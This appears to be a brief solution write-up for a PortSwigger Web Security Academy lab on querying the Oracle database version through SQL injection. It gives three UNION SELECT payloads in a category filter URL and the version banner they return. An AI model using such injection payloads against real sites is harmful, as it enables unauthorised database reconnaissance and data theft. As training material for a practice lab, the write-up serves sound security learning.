# Lab

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

## Payload

```sql
/filter?category='+UNION+SELECT+NULL,NULL FROM dual--
```

```sql
/filter?category='+UNION+SELECT+'abc','def' FROM dual--
```

```sql
/filter?category='+UNION+SELECT+BANNER, NULL FROM v$version--
```

### Result

```
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```